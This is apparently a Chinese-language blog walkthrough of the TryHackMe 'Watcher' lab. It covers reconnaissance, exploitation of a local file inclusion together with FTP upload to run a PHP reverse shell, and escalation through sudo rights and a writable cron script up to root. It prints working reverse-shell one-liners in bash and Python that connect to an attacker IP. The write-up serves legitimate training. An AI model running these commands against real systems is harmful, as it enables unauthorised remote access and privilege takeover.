---
title: "THM Watcher"
description: "TryHackMe篇之Watcher"

date: 2024-10-18T19:32:56+08:00
lastmod: 2025-11-11T13:57:08+08:00

math: true
mermaid: true

categories:
  - TryHackMe
tags:
  - Linux
---
<!--more-->

> 靶机ip：10.10.76.81

# 信息收集

## nmap扫描

 ```bash
nmap --min-rate 10000 -A -sV -sC -p- 10.10.76.81
 ```

![image-20241021132444064](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021132502836-1887610598.png)

发现开放21，22，80端口

## 21端口

尝试一下匿名登录

![image-20241021132544221](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021132601829-412050595.png)

匿名登陆失败

## 80端口

![image-20241021132630028](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021132647834-1011735877.png)

![image-20241021132751518](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021132809242-1024503247.png)

随便点击后发现在url处疑似存在文件包含，尝试利用一下

`/post.php?post=/etc/passwd`

![image-20241021132830423](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021132848048-1949569944.png)

此处确实存在文件包含

再扫描一下目录

```bash
gobuster dir -u http://10.10.76.81/ -w /usr/share/wordlists/dirb/common.txt
```

![image-20241021133237741](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021133255264-514546742.png)

* `robots.txt`

![image-20241021133323903](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021133341367-1636037732.png)

找到俩文件

![image-20241021133412280](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021133429703-900456467.png)

其中一个是flag1

![image-20241021133506063](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021133523610-110842426.png)

另一个无法访问，但是可以用之前发现的文件包含读取文件

`/post.php?post=secret_file_do_not_read.txt`

![image-20241021133549160](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021133606595-1706470773.png)

发现另一重要目录`/home/ftpuser/ftp/files`，同时最后面像是一组用户名密码`ftpuser:givemefiles777`，再次尝试登录ftp

```bash
ftp ftpuser@10.10.76.81
```

![image-20241021133958383](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021134015974-2036326351.png)

登陆成功，并找到flag2

同时files目录就是之前通过任意文件读取找到的目录 

# 获得初始访问权限

我们可以尝试一下，通过ftp上传的文件，我们知道其绝对路径，就可以通过文件读取进行利用

先简单尝试一下，准备个php文件

![image-20241021134710659](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021134728595-1142287777.png)

通过ftp上传文件

![image-20241021134723674](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021134741144-1604384591.png)

此时文件的绝对路径就是`/home/ftpuser/ftp/files/info.php`

再通过浏览器读取该文件

![image-20241021134820399](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021134838040-1001287900.png)

成功读取，同时php代码也可以被解析，可以利用这个进行反弹shell

准备好我们的[webshell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)

![image-20241021135010474](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021135028115-2037447420.png)

设置好ip和port

将文件通过ftp上传到服务器上

![image-20241021135312126](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021135329563-557176968.png)

攻击机设置好监听

![image-20241021135330242](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021135347617-1267050085.png)

浏览器读取并访问我们的shell文件

`/post.php?post=/home/ftpuser/ftp/files/php-reverse-shell.php`

![image-20241021135423056](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021135440557-392731814.png)

拿到shell

# 主机用户信息收集

我们已经获得了`www-data`权限，能够简单的访问服务器资源，我们需要更进一步的控制这台服务器，就需要继续提升我们的权限

![image-20241021135911555](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021135929107-235560157.png)

在`/home/mat`下，找到flag5，但是权限不够无法访问，但是可以查看`note.txt`

![image-20241021140022894](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021140040335-1570935829.png)

发现可以使用脚本执行，查看一下

![image-20241021140134588](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021140152087-852207533.png)

先切换到交互式shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

发现该文件只提供了三个可以执行的命令，因为文件所属权不属于当前用户，所以无法更改，看下其他用户目录

![image-20241021140625275](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021140642766-1756489674.png)

还有个`note.txt`，查看一下，`flag4`还是没权限查看，同时还注意到有个`jobs`目录

![image-20241021141230381](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021141248050-1048480932.png)

看样子是想提醒我们查看`jobs`目录

![image-20241021141313651](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021141331204-1164871302.png)

这是一个脚本文件，里面有cat命令

继续查看最后一个用户

![image-20241021141411017](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021141428606-130895387.png)

这里只有flag6，仍然无权限读取

![image-20241021141749594](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021141806989-1106969102.png)

在web目录下找到flag3

# 提升至user权限

## 提升至toby权限

先检查下`sudo -l`

![image-20241021144634735](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021144652253-1150780171.png)

发现可以使用`toby`执行任何命令`sudo`无需密码

![image-20241021144809623](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021144827096-1301873310.png)

获取`toby`用户权限，并拿到flag4

## 横移至mat权限

结合之前的信息可知toby的`jobs`目录中`cow.sh`是mat的，而我们可以修改该文件，所以我们可以通过写反弹shell获取mat的权限

攻击机先设置监听

![image-20241021145634230](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021145651665-600001604.png)

在靶机中

```bash
echo "bash -i >& /dev/tcp/10.14.90.122/8889 0>&1" >> cow.sh
```

![image-20241021145803589](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021145821073-1468765908.png)

![image-20241021150104300](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021150121987-290344974.png)

过一会等定时任务触发，就拿到了mat的shell，并在当前目录找到flag5

![image-20241021150537504](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021150554982-1695743786.png)

## 横移至will权限

现在已经拿到了mat的权限，查看一下`sudo -l`

![image-20241021151138536](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021151156011-979402750.png)

发现我们可以不用密码执行`will`权限的`python3`命令

![image-20241021151707919](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021151729954-690550907.png)

结合之前分析的结果可知，我们有权修改`cmd.py`，无权更改`will_script.py`，但是`will_script.py`会调用`cmd.py`，所以我们就可以通过修改`cmd.py`的内容，在其中写上反弹shell的python代码，使用`will`权限的`python3`执行`will_script.py`，我们就获得了`will`的shell

先在kali上设置监听

![image-20241021152037707](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021152055316-382361973.png)

在靶机上写入python代码

```bash
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.14.90.122",8899));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' >> cmd.py
```

![image-20241021152240564](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021152258357-765071767.png)

执行

![image-20241021152328180](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021152345593-107476696.png)

![image-20241021152340822](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021152358318-1138667333.png)

获得will的shell

![image-20241021152436836](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021152454277-1738449844.png)

找到flag6

# 提升至root权限

使用will继续查找敏感文件

![image-20241021152839278](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021152856987-194567056.png)

在`/opt/backups`下找到了经过`base64`编码的key

将其保存到文件`base64_key`解码查看

![image-20241021153035699](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021153053351-1239828122.png)

发现是一组私钥，猜测是root的，将私钥保存到文件`id_rsa`，并赋予`600`权限便于ssh连接

```bash
ssh root@10.10.76.81 -i id_rsa
```

![image-20241021153436661](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021153454825-905657572.png)

获得root权限

![image-20241021153501169](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021153518635-300441644.png)

在当前目录找到最后一个flag7

